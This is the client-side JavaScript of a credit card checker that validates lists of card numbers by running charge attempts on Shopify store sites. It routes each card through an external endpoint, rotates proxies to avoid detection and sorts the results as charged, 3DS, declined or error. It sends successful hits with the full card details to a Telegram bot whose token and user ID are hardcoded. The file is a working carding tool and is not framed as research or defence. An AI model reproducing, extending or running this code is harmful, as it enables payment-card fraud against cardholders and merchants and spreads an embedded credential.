
        // Theme Toggle and Persistence
        function toggleTheme() {
            document.body.classList.toggle('dark');
            document.body.classList.toggle('light');
            const icon = document.querySelector('.theme-toggle i');
            if (document.body.classList.contains('dark')) {
                icon.classList.remove('fa-sun');
                icon.classList.add('fa-moon');
                localStorage.setItem('theme', 'dark');
            } else {
                icon.classList.remove('fa-moon');
                icon.classList.add('fa-sun');
                localStorage.setItem('theme', 'light');
            }
        }

        // Load saved theme
        const savedTheme = localStorage.getItem('theme') || 'dark';
        document.body.classList.add(savedTheme);
        if (savedTheme === 'light') {
            document.querySelector('.theme-toggle i').classList.add('fa-sun');
        } else {
            document.querySelector('.theme-toggle i').classList.add('fa-moon');
        }

        // Data stores
        let liveCards = [];
        let threeDS = [];
        let declinedCards = [];
        let errorCards = [];
        let cardsProcessedCount = 0;
        let totalCards = 0;
        let isPaused = false;
        let requestQueue = [];
        let activeRequests = 0;
        let currentSiteIndex = 0;
        let currentProxyIndex = 0;

        // Telegram Bot Token - Your provided bot token
        const BOT_TOKEN = '8272538793:AAGV-Tkw7uNC2AEq9Hx9tO4e4vusBf-_BHc';
        let telegramUserId = '6637227162';

        // Endpoint
        const ENDPOINT_URL = 'https://da-flamingo.onrender.com/';

        // Fixed rate limit at 1 second
        const RATE_LIMIT_DELAY = 1000;

        // Error keywords (system/technical errors only, not declined cards)
        const ERROR_KEYWORDS = [
            'Invalid URL', 'Error in 1 req', 'Product id is empty', 'Item is out of stock', 'Item out of stock',
            'Token Empty', 'Clinte Token', 'Client Token', 'Id empty', 'py id empty', 'r2 id empty',
            'cURL error', 'r3 token empty', 'del ammount empty', 'tax ammount empty',
            'cn url empty', 'delivery ammount empty', 'r4 token empty', 'HCAPTCHA DETECTED',
            'timeout', 'network error', 'connection failed', 'server error', 'bad request',
            'unauthorized', 'forbidden', 'not found', 'method not allowed', 'internal server error',
            'service unavailable', 'gateway timeout', 'processing_error', 'issuer_not_available',
            'try_again_later', 'service_not_allowed', 'authentication_required', 'merchant_blacklist',
            'invalid_account', 'currency_not_supported', 'duplicate_transaction', 'card_not_supported'
        ];

        // UI elements
        const loader = document.getElementById('loader');
        const statusMessage = document.getElementById('status-message');
        const progressBar = document.getElementById('progress-bar');
        const resultsContainer = document.getElementById('results-container');
        const logContainer = document.getElementById('log-container');
        const liveCount = document.getElementById('live-count');
        const threeDSCount = document.getElementById('3ds-count');
        const declineCount = document.getElementById('decline-count');
        const errorsCount = document.getElementById('errors-count');
        const siteList = document.getElementById('siteList');
        const ccList = document.getElementById('ccList');
        const proxyList = document.getElementById('proxyList');
        const siteFileInput = document.getElementById('siteFileInput');
        const ccFileInput = document.getElementById('ccFileInput');
        const proxyFileInput = document.getElementById('proxyFileInput');
        const mainForm = document.getElementById('mainForm');
        const pauseBtn = document.getElementById('pause-btn');
        const resumeBtn = document.getElementById('resume-btn');
        const clearBtn = document.getElementById('clear-btn');
        const autoSaveCheckbox = document.getElementById('autoSave');
        const soundNotifyCheckbox = document.getElementById('soundNotify');
        const telegramUserIdInput = document.getElementById('telegramUserId');
        const notifySound = document.getElementById('notify-sound');

        // Telegram Functions
        telegramUserIdInput.addEventListener('input', (e) => {
            telegramUserId = e.target.value.trim();
        });

        async function sendTelegramMessage(text) {
            if (!telegramUserId) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: telegramUserId, 
                        text: text, 
                        parse_mode: 'HTML' 
                    })
                });
            } catch (e) {
                console.log('Telegram send error:', e);
            }
        }

        async function verifyTelegram() {
            const userId = telegramUserIdInput.value.trim();
            if (!userId) {
                alert('Please enter your Telegram User ID first.');
                return;
            }
            telegramUserId = userId;
            await sendTelegramMessage('<b>✅ Verification Successful!</b>\n\nYour Telegram is now connected to the CC Checker. You will receive notifications when hits or 3DS cards are found.');
            alert('Verification message sent! Check your Telegram.');
        }

        // Event Listeners
        mainForm.addEventListener('submit', handleCombinedSubmit);
        pauseBtn.addEventListener('click', pauseProcessing);
        resumeBtn.addEventListener('click', resumeProcessing);
        clearBtn.addEventListener('click', clearAll);
        
        siteFileInput.addEventListener('change', (e) => handleFileUpload(e, siteList));
        ccFileInput.addEventListener('change', (e) => handleFileUpload(e, ccList));
        proxyFileInput.addEventListener('change', (e) => handleFileUpload(e, proxyList));

        async function handleFileUpload(event, textarea) {
            const file = event.target.files[0];
            if (file) {
                const lines = await readFile(file);
                textarea.value = lines.join('\n');
            }
        }

        async function readFile(file) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const lines = e.target.result.split('\n').filter(line => line.trim() !== '');
                    resolve(lines);
                };
                reader.readAsText(file);
            });
        }

        // Validate CC format (basic Luhn check)
        function isValidCC(cc) {
            const ccParts = cc.split('|');
            if (ccParts.length !== 4) return false;
            const cardNumber = ccParts[0].replace(/\D/g, '');
            let sum = 0;
            let isEven = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i), 10);
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                isEven = !isEven;
            }
            return sum % 10 === 0;
        }

        // Handle form submission
        async function handleCombinedSubmit(event) {
            event.preventDefault();
            
            const siteLines = siteList.value.split('\n').filter(line => line.trim() !== '');
            const ccLines = ccList.value.split('\n').filter(line => line.trim() !== '');
            const proxyLines = proxyList.value.split('\n').filter(line => line.trim() !== '');

            if (siteLines.length === 0 || ccLines.length === 0) {
                alert("Please enter or upload at least one site and one credit card.");
                return;
            }

            // Validate CCs
            const invalidCCs = ccLines.filter(cc => !isValidCC(cc));
            if (invalidCCs.length > 0) {
                alert(`Invalid CC formats detected: ${invalidCCs.join(', ')}`);
                return;
            }

            resetState();
            totalCards = ccLines.length;
            startLoading(`Checking...`);

            requestQueue = ccLines.map((cc, index) => ({
                cc,
                siteLines,
                proxyLines,
                index
            }));
            
            pauseBtn.disabled = false;
            resumeBtn.disabled = true;

            processNext();
        }

        // Processing logic with concurrency, pause/resume, proxy rotation
        async function processNext() {
            if (isPaused || requestQueue.length === 0) {
                if (activeRequests === 0 && requestQueue.length === 0) {
                    stopLoading('Processing Complete.');
                    if (autoSaveCheckbox.checked) saveResultsToLocalStorage();
                }
                return;
            }

            if (activeRequests >= 5) return; // Max concurrent

            const request = requestQueue.shift();
            activeRequests++;

            statusMessage.textContent = `Checking... (card ${request.index + 1} of ${totalCards})`;
            updateProgress();

            // Rotate proxy
            const proxyToUse = request.proxyLines[currentProxyIndex % request.proxyLines.length] || '';
            currentProxyIndex++;

            const result = await processCardOnSites(request.cc, request.siteLines, proxyToUse, currentSiteIndex);

            if (result) {
                currentSiteIndex = result.siteIndex;
                addResultToDOM(result.resultData, result.cardClass);
                addToDownloadList(result.resultData, result.cardClass);
                addLog(`Processed ${request.cc} on ${result.resultData.site} - Status: ${result.resultData.status}`);
                if (result.cardClass === 'hits' && soundNotifyCheckbox.checked) {
                    notifySound.play();
                }

                // Send Telegram notification for hits and 3DS
                if ((result.cardClass === 'hits' || result.cardClass === 'three-ds') && telegramUserId) {
                    const emoji = result.cardClass === 'hits' ? '✅' : '🔵';
                    const statusText = result.cardClass === 'hits' ? 'Charged' : '3DS';
                    const message = `<b>${statusText} ${emoji}</b>\n<b>Card:</b> <code>${result.resultData.card}</code>\n<b>Response:</b> ${result.resultData.status}\n<b>Gate:</b> Shopify\n<b>Site:</b> ${result.resultData.site}\n<b>Time:</b> ${result.resultData.time}`;
                    await sendTelegramMessage(message);
                }
            } else {
                const resultData = { card: request.cc, site: 'All sites', status: "All sites failed for this card.", gate: "N/A", time: "N/A" };
                const cardClass = 'error';
                addResultToDOM(resultData, cardClass);
                addToDownloadList(resultData, cardClass);
                addLog(`All sites failed for ${request.cc}`);
            }

            cardsProcessedCount++;
            activeRequests--;
            setTimeout(processNext, RATE_LIMIT_DELAY); // Fixed 1 second delay
            processNext(); // Fill concurrency
        }

        async function processCardOnSites(cc, siteLines, proxyToUse, startSiteIndex) {
            let numSites = siteLines.length;
            let siteIndex = startSiteIndex;

            for (let i = 0; i < numSites; i++) {
                const site = siteLines[siteIndex % numSites];
                const endpointUrl = `${ENDPOINT_URL}?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${encodeURIComponent(proxyToUse)}`;
                
                const startTime = performance.now();

                try {
                    const response = await fetch(endpointUrl);
                    const responseText = await response.text();
                    const endTime = performance.now();
                    const timeTaken = ((endTime - startTime) / 1000).toFixed(2);
                    
                    let responseData;
                    try {
                        responseData = JSON.parse(responseText);
                    } catch (e) {
                        responseData = null;
                    }

                    let cardStatus, cardClass;
                    let gate = "Shopify";
                    let amount = null;
                    
                    if (responseData && responseData.Response) {
                        const apiResponse = responseData.Response;
                        amount = responseData.Price;
                        
                        const lowerCaseResponse = apiResponse.toLowerCase();
                        
                        // Check for system/technical errors first
                        const isSystemError = ERROR_KEYWORDS.some(keyword => lowerCaseResponse.includes(keyword.toLowerCase()));

                        if (isSystemError) {
                             cardStatus = `Error: ${apiResponse}`;
                             cardClass = 'error';
                             statusMessage.textContent = `Error on site ${site}. Switching to next site for this card...`;
                             addLog(`Error on ${site} for ${cc}: ${apiResponse}`);
                             siteIndex++;
                             continue;
                        } else if (lowerCaseResponse.includes("thank you")) {
                            // Parse amount from "Thank You 15.0" format
                            const thankYouMatch = apiResponse.match(/thank you\s*([\d.]+)/i);
                            const extractedAmount = thankYouMatch ? thankYouMatch[1] : amount;
                            cardStatus = `Thank you for your order${extractedAmount ? ` ($${extractedAmount})` : ''}`;
                            cardClass = 'hits';
                        } else if (lowerCaseResponse.includes("3ds") || lowerCaseResponse.includes("3d_authentication")) {
                            cardStatus = "3DS Required";
                            cardClass = 'three-ds';
                        } else {
                            // Everything else is a decline (including CARD_DECLINED)
                            cardStatus = `API Response: ${apiResponse}`;
                            cardClass = 'decline';
                        }
                    } else {
                        // Check if raw response contains "Thank You"
                        const lowerResponse = responseText.toLowerCase();
                        if (lowerResponse.includes("thank you")) {
                            const thankYouMatch = responseText.match(/thank you\s*([\d.]+)/i);
                            const extractedAmount = thankYouMatch ? thankYouMatch[1] : null;
                            cardStatus = `Thank you for your order${extractedAmount ? ` ($${extractedAmount})` : ''}`;
                            cardClass = 'hits';
                        } else {
                            cardStatus = `Raw Response: ${responseText}`;
                            cardClass = 'decline';
                        }
                    }
                    
                    const resultData = {
                        card: cc,
                        site,
                        status: cardStatus,
                        gate,
                        time: `${timeTaken}s`,
                        amount
                    };

                    return {
                        resultData,
                        cardClass,
                        siteIndex: siteIndex + 1
                    };

                } catch (error) {
                    console.error('Fetch error:', error);
                    statusMessage.textContent = `Network error on site ${site}. Switching to next site for this card...`;
                    addLog(`Network error on ${site} for ${cc}: ${error.message}`);
                    siteIndex++;
                    continue; 
                }
            }

            return null;
        }

        function pauseProcessing() {
            isPaused = true;
            pauseBtn.disabled = true;
            resumeBtn.disabled = false;
            statusMessage.textContent = 'Processing Paused.';
            addLog('Processing paused.');
        }

        function resumeProcessing() {
            isPaused = false;
            pauseBtn.disabled = false;
            resumeBtn.disabled = true;
            statusMessage.textContent = `Resuming processing...`;
            addLog('Processing resumed.');
            processNext();
        }

        function clearAll() {
            resetState();
            logContainer.innerHTML = '';
            addLog('Cleared all data.');
        }

        function updateProgress() {
            const progress = (cardsProcessedCount / totalCards) * 100;
            progressBar.style.width = `${progress}%`;
        }

        // Add result to DOM with new format
        function addResultToDOM(data, cardClass) {
            let displayStatus = '';
            if (cardClass === 'hits') {
                displayStatus = 'Charged ✅';
            } else if (cardClass === 'decline') {
                displayStatus = 'Declined ❌';
            } else if (cardClass === 'three-ds') {
                displayStatus = '3DS 🔵';
            } else {
                displayStatus = 'Error ⚠️';
            }

            const resultCard = document.createElement('div');
            resultCard.className = `result-card ${cardClass}`;
            resultCard.innerHTML = `
                <p><strong>${displayStatus}</strong></p>
                <p><strong>Card:</strong> ${data.card}</p>
                <p><strong>Response:</strong> ${data.status}</p>
                <p><strong>Gate:</strong> ${data.gate}</p>
                <p><strong>Time:</strong> ${data.time}</p>
            `;
            resultsContainer.prepend(resultCard);
        }

        // Add to download list (FIXED: Only count in correct category)
        function addToDownloadList(data, cardClass) {
            const cardString = `${data.card} | ${data.site} | ${data.status}`;
            
            // Clear classification - only add to one category
            if (cardClass === 'hits') {
                liveCards.push(cardString);
                liveCount.textContent = liveCards.length;
            } else if (cardClass === 'three-ds') {
                threeDS.push(cardString);
                threeDSCount.textContent = threeDS.length;
            } else if (cardClass === 'decline') {
                declinedCards.push(cardString);
                declineCount.textContent = declinedCards.length;
            } else if (cardClass === 'error') {
                errorCards.push(cardString);
                errorsCount.textContent = errorCards.length;
            }
        }

        // Add log entry
        function addLog(message) {
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.prepend(logEntry);
        }

        // Save results to local storage
        function saveResultsToLocalStorage() {
            const results = {
                live: liveCards,
                threeDS: threeDS,
                declined: declinedCards,
                errors: errorCards
            };
            localStorage.setItem('ccCheckerResults', JSON.stringify(results));
            addLog('Results saved to local storage.');
        }

        // Download file
        function downloadFile(dataArray, type) {
            if (dataArray.length === 0) {
                alert(`No ${type} cards to download.`);
                return;
            }
            const data = dataArray.join('\n');
            const blob = new Blob([data], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            const now = new Date();
            const timestamp = `${now.getFullYear()}-${(now.getMonth() + 1).toString().padStart(2, '0')}-${now.getDate().toString().padStart(2, '0')}_${now.getHours().toString().padStart(2, '0')}-${now.getMinutes().toString().padStart(2, '0')}`;
            a.download = `${type}_cards_${timestamp}.txt`;
            a.href = url;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        // Reset state
        function resetState() {
            liveCards = [];
            threeDS = [];
            declinedCards = [];
            errorCards = [];
            cardsProcessedCount = 0;
            totalCards = 0;
            requestQueue = [];
            activeRequests = 0;
            currentSiteIndex = 0;
            currentProxyIndex = 0;
            isPaused = false;
            liveCount.textContent = 0;
            threeDSCount.textContent = 0;
            declineCount.textContent = 0;
            errorsCount.textContent = 0;
            resultsContainer.innerHTML = '';
            progressBar.style.width = '0%';
            pauseBtn.disabled = true;
            resumeBtn.disabled = true;
        }

        function startLoading(message) {
            loader.style.display = 'block';
            statusMessage.textContent = message;
        }

        function stopLoading(message) {
            loader.style.display = 'none';
            statusMessage.textContent = message;
            pauseBtn.disabled = true;
            resumeBtn.disabled = true;
        }
    
